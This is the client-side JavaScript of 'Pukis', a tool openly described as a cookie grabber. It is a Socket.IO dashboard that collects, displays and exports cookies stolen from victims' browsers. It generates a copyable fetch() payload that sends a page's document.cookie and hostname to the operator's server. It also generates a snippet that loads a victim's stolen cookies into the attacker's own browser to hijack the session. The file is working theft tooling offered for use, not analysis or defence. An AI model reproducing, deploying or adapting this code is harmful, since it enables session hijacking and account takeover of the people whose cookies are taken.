// Pukis - Cookies Grabber Client-Side JavaScript
class PukisClient {
    constructor() {
        this.socket = null;
        this.currentRoom = null;
        this.cookiesData = [];
        this.isConnected = false;
        
        this.initializeElements();
        this.bindEvents();
        this.updateConnectionStatus(false);
    }

    initializeElements() {
        // Sections
        this.loginSection = document.getElementById('login-section');
        this.cookiesSection = document.getElementById('cookies-section');
        this.loadingOverlay = document.getElementById('loading-overlay');
        
        // Form elements
        this.roomForm = document.getElementById('room-form');
        this.roomIdInput = document.getElementById('room-id');
        this.connectBtn = this.roomForm.querySelector('.hack-btn');
        this.errorMessage = document.getElementById('error-message');
        
        // Status elements
        this.connectionStatus = document.getElementById('connection-status');
        this.statusIndicator = document.querySelector('.status-indicator');
        this.currentRoomSpan = document.getElementById('current-room');
        
        // Stats elements
        this.totalCookiesSpan = document.getElementById('total-cookies');
        this.activeSessionsSpan = document.getElementById('active-sessions');
        this.lastUpdateSpan = document.getElementById('last-update');
        
        // Table elements
        this.cookiesTable = document.getElementById('cookies-table');
        this.cookiesTbody = document.getElementById('cookies-tbody');
        
        // Control buttons
        this.clearBtn = document.getElementById('clear-btn');
        this.exportBtn = document.getElementById('export-btn');
        this.disconnectBtn = document.getElementById('disconnect-btn');
        this.copyInterceptBtn = document.getElementById('copy-intercept-btn');
        
        // Toast notification
        this.copyToast = document.getElementById('copy-toast');
    }

    bindEvents() {
        // Room form submission
        this.roomForm.addEventListener('submit', (e) => {
            e.preventDefault();
            this.connectToRoom();
        });

        // Control buttons
        this.clearBtn.addEventListener('click', () => this.clearAllCookies());
        this.exportBtn.addEventListener('click', () => this.exportCookies());
        this.disconnectBtn.addEventListener('click', () => this.disconnect());
        this.copyInterceptBtn.addEventListener('click', () => this.copyInterceptCode());

        // Room ID input validation
        this.roomIdInput.addEventListener('input', (e) => {
            this.validateRoomId(e.target);
        });

        // Enter key on room input
        this.roomIdInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.connectToRoom();
            }
        });
    }

    validateRoomId(input) {
        // Only allow letters, numbers, and convert everything else to underscore
        const sanitized = input.value.replace(/[^a-zA-Z0-9]/g, '_');
        if (input.value !== sanitized) {
            input.value = sanitized;
        }
    }

    async connectToRoom() {
        const roomId = this.roomIdInput.value.trim();
        
        if (!roomId) {
            this.showError('Please enter a room ID');
            return;
        }

        this.showLoading(true);
        this.setButtonLoading(this.connectBtn, true);
        this.hideError();

        try {
            // Initialize Socket.IO connection
            this.socket = io();
            
            // Set up socket event listeners
            this.setupSocketListeners();
            
            // Join the room
            await this.joinRoom(roomId);
            
        } catch (error) {
            console.error('Connection error:', error);
            this.showError('Failed to connect to server');
            this.showLoading(false);
            this.setButtonLoading(this.connectBtn, false);
        }
    }

    setupSocketListeners() {
        this.socket.on('connect', () => {
            console.log('Connected to server');
        });

        this.socket.on('disconnect', () => {
            console.log('Disconnected from server');
            this.updateConnectionStatus(false);
            this.isConnected = false;
        });

        this.socket.on('room_joined', (data) => {
            console.log('Joined room:', data);
            this.currentRoom = data.room_id;
            this.isConnected = true;
            this.updateConnectionStatus(true);
            this.showCookiesSection();
            this.showLoading(false);
            this.setButtonLoading(this.connectBtn, false);
            
            // Load existing cookies if any
            if (data.existing_cookies) {
                this.loadExistingCookies(data.existing_cookies);
            }
        });

        this.socket.on('room_error', (error) => {
            console.error('Room error:', error);
            this.showError(error.message || 'Failed to join room');
            this.showLoading(false);
            this.setButtonLoading(this.connectBtn, false);
        });

        this.socket.on('message', (cookieData) => {
            console.log('New cookies received:', cookieData);
            this.addCookieEntry(cookieData);
            this.updateStats();
            this.updateLastUpdate();
        });

        this.socket.on('cookies_cleared', () => {
            console.log('Cookies cleared by server');
            this.cookiesData = [];
            this.renderCookiesTable();
            this.updateStats();
        });
    }

    joinRoom(roomId) {
        return new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                reject(new Error('Connection timeout'));
            }, 10000);

            this.socket.emit('join_room', { room_id: roomId });
            
            this.socket.once('room_joined', (data) => {
                clearTimeout(timeout);
                resolve(data);
            });

            this.socket.once('room_error', (error) => {
                clearTimeout(timeout);
                reject(error);
            });
        });
    }

    loadExistingCookies(cookies) {
        this.cookiesData = cookies || [];
        this.renderCookiesTable();
        this.updateStats();
    }

    addCookieEntry(cookieData) {
        const entry = {
            id: Date.now() + Math.random(),
            hostname: cookieData.hostname || 'Unknown',
            timestamp: new Date().toISOString(),
            cookies: cookieData.cookies || cookieData,
            raw_cookies: cookieData.raw_cookies || JSON.stringify(cookieData)
        };

        this.cookiesData.unshift(entry); // Add to beginning
        this.renderCookiesTable();
    }

    renderCookiesTable() {
        this.cookiesTbody.innerHTML = '';

        this.cookiesData.forEach(entry => {
            const row = this.createCookieRow(entry);
            this.cookiesTbody.appendChild(row);
        });
    }

    createCookieRow(entry) {
        const row = document.createElement('tr');
        
        // Parse cookies for display
        const parsedCookies = this.parseCookies(entry.cookies);
        const cookiesHtml = parsedCookies.map(cookie => 
            `<div class="cookie-item">${cookie.name}=${cookie.value}</div>`
        ).join('');

        row.innerHTML = `
            <td class="hostname">${this.escapeHtml(entry.hostname)}</td>
            <td class="timestamp">${this.formatTimestamp(entry.timestamp)}</td>
            <td class="cookies-cell">${cookiesHtml}</td>
            <td>
                <button class="copy-btn" onclick="pukisClient.copyCookies('${entry.id}')">
                    COPY
                </button>
            </td>
        `;

        return row;
    }

    parseCookies(cookies) {
        if (typeof cookies === 'string') {
            try {
                cookies = JSON.parse(cookies);
            } catch (e) {
                // If it's a cookie string, parse it
                return this.parseCookieString(cookies);
            }
        }

        if (Array.isArray(cookies)) {
            return cookies.map(cookie => ({
                name: cookie.name || 'unknown',
                value: cookie.value || ''
            }));
        }

        if (typeof cookies === 'object') {
            return Object.entries(cookies).map(([name, value]) => ({
                name,
                value: String(value)
            }));
        }

        return [{ name: 'data', value: String(cookies) }];
    }

    parseCookieString(cookieString) {
        const cookies = [];
        const pairs = cookieString.split(';');
        
        pairs.forEach(pair => {
            const [name, ...valueParts] = pair.trim().split('=');
            if (name) {
                cookies.push({
                    name: name.trim(),
                    value: valueParts.join('=').trim()
                });
            }
        });

        return cookies;
    }

    getCookiesString(entry) {
        // Try to get cookies string from different possible formats
        if (typeof entry.cookies === 'string') {
            // If it's already a string, use it directly
            return entry.cookies;
        }
        
        if (entry.raw_cookies && typeof entry.raw_cookies === 'string') {
            try {
                const parsed = JSON.parse(entry.raw_cookies);
                if (typeof parsed === 'string') {
                    return parsed;
                }
                if (parsed.cookies && typeof parsed.cookies === 'string') {
                    return parsed.cookies;
                }
            } catch (e) {
                // If it's not JSON, treat as raw cookie string
                return entry.raw_cookies;
            }
        }
        
        // If cookies is an object or array, convert to cookie string format
        if (typeof entry.cookies === 'object') {
            if (Array.isArray(entry.cookies)) {
                return entry.cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
            } else {
                return Object.entries(entry.cookies).map(([name, value]) => `${name}=${value}`).join('; ');
            }
        }
        
        // Fallback
        return String(entry.cookies || '');
    }

    copyCookies(entryId) {
        const entry = this.cookiesData.find(e => e.id == entryId);
        if (!entry) return;

        // Convert cookies to the specified format
        const cookiesString = this.getCookiesString(entry);
        const cookieSetterCode = `Object.entries({...document.cookie.split(";").reduce((a,c)=>{let[k,...v]=c.trim().split("=");a[k]=v.join("=");return a},{}),...("${cookiesString}".split(";").reduce((a,c)=>{let[k,...v]=c.trim().split("=");a[k]=v.join("=");return a},{}))}).forEach(([k,v])=>document.cookie=\`\${k}=\${v}; path=/\` );`;
        
        navigator.clipboard.writeText(cookieSetterCode).then(() => {
            this.showCopyToast();
            alert('✅ Cookie setter code berhasil di copy ke clipboard!');
        }).catch(err => {
            console.error('Failed to copy:', err);
            // Fallback for older browsers
            this.fallbackCopyTextToClipboard(cookieSetterCode);
        });
    }

    fallbackCopyTextToClipboard(text) {
        const textArea = document.createElement('textarea');
        textArea.value = text;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        
        try {
            document.execCommand('copy');
            this.showCopyToast();
            alert('✅ Cookie setter code berhasil di copy ke clipboard!');
        } catch (err) {
            console.error('Fallback copy failed:', err);
            alert('❌ Gagal copy cookie setter code ke clipboard!');
        }
        
        document.body.removeChild(textArea);
    }

    showCopyToast(message = 'Cookies copied to clipboard!') {
        const toastText = this.copyToast.querySelector('.toast-text');
        toastText.textContent = message;
        this.copyToast.classList.add('show');
        setTimeout(() => {
            this.copyToast.classList.remove('show');
        }, 3000);
    }

    clearAllCookies() {
        if (confirm('Are you sure you want to clear all cookies data?')) {
            this.cookiesData = [];
            this.renderCookiesTable();
            this.updateStats();
            
            // Notify server to clear room data
            if (this.socket && this.currentRoom) {
                this.socket.emit('clear_room_cookies', { room_id: this.currentRoom });
            }
        }
    }

    exportCookies() {
        const dataStr = JSON.stringify(this.cookiesData, null, 2);
        const dataBlob = new Blob([dataStr], { type: 'application/json' });
        
        const link = document.createElement('a');
        link.href = URL.createObjectURL(dataBlob);
        link.download = `pukis_cookies_${this.currentRoom}_${new Date().toISOString().split('T')[0]}.json`;
        link.click();
        
        URL.revokeObjectURL(link.href);
    }

    copyInterceptCode() {
        if (!this.currentRoom) {
            this.showError('No active room');
            return;
        }

        const currentHost = window.location.origin;
        const interceptCode = `fetch('${currentHost}/send/${this.currentRoom}', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({hostname: window.location.hostname, cookies: document.cookie})});`;
        
        navigator.clipboard.writeText(interceptCode).then(() => {
            this.showCopyToast('Intercept code copied to clipboard!');
            alert('✅ Intercept code berhasil di copy ke clipboard!');
        }).catch(err => {
            console.error('Failed to copy intercept code:', err);
            // Fallback for older browsers
            this.fallbackCopyInterceptCode(interceptCode);
        });
    }

    fallbackCopyInterceptCode(text) {
        const textArea = document.createElement('textarea');
        textArea.value = text;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        
        try {
            document.execCommand('copy');
            this.showCopyToast('Intercept code copied to clipboard!');
            alert('✅ Intercept code berhasil di copy ke clipboard!');
        } catch (err) {
            console.error('Fallback intercept code copy failed:', err);
            alert('❌ Gagal copy intercept code ke clipboard!');
        }
        
        document.body.removeChild(textArea);
    }

    disconnect() {
        if (this.socket) {
            this.socket.disconnect();
        }
        
        this.isConnected = false;
        this.currentRoom = null;
        this.cookiesData = [];
        this.updateConnectionStatus(false);
        this.showLoginSection();
        this.roomIdInput.value = '';
    }

    showLoginSection() {
        this.loginSection.classList.remove('hidden');
        this.cookiesSection.classList.add('hidden');
    }

    showCookiesSection() {
        this.loginSection.classList.add('hidden');
        this.cookiesSection.classList.remove('hidden');
        this.currentRoomSpan.textContent = this.currentRoom;
    }

    showLoading(show) {
        if (show) {
            this.loadingOverlay.classList.remove('hidden');
        } else {
            this.loadingOverlay.classList.add('hidden');
        }
    }

    setButtonLoading(button, loading) {
        if (loading) {
            button.classList.add('loading');
        } else {
            button.classList.remove('loading');
        }
    }

    showError(message) {
        this.errorMessage.textContent = message;
        this.errorMessage.classList.add('show');
    }

    hideError() {
        this.errorMessage.classList.remove('show');
    }

    updateConnectionStatus(connected) {
        this.isConnected = connected;
        
        if (connected) {
            this.connectionStatus.textContent = 'CONNECTED';
            this.statusIndicator.classList.remove('disconnected');
            this.statusIndicator.classList.add('connected');
        } else {
            this.connectionStatus.textContent = 'DISCONNECTED';
            this.statusIndicator.classList.remove('connected');
            this.statusIndicator.classList.add('disconnected');
        }
    }

    updateStats() {
        this.totalCookiesSpan.textContent = this.cookiesData.length;
        
        // Count unique hostnames as active sessions
        const uniqueHostnames = new Set(this.cookiesData.map(entry => entry.hostname));
        this.activeSessionsSpan.textContent = uniqueHostnames.size;
    }

    updateLastUpdate() {
        const now = new Date();
        const timeString = now.toLocaleTimeString('en-US', { 
            hour12: false,
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        this.lastUpdateSpan.textContent = timeString;
    }

    formatTimestamp(timestamp) {
        const date = new Date(timestamp);
        return date.toLocaleString('en-US', {
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });
    }

    escapeHtml(text) {
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return text.replace(/[&<>"']/g, m => map[m]);
    }
}

// Initialize the Pukis client when DOM is loaded
let pukisClient;

document.addEventListener('DOMContentLoaded', () => {
    pukisClient = new PukisClient();
    console.log('Pukis Client initialized');
});

// Expose globally for button onclick handlers
window.pukisClient = pukisClient;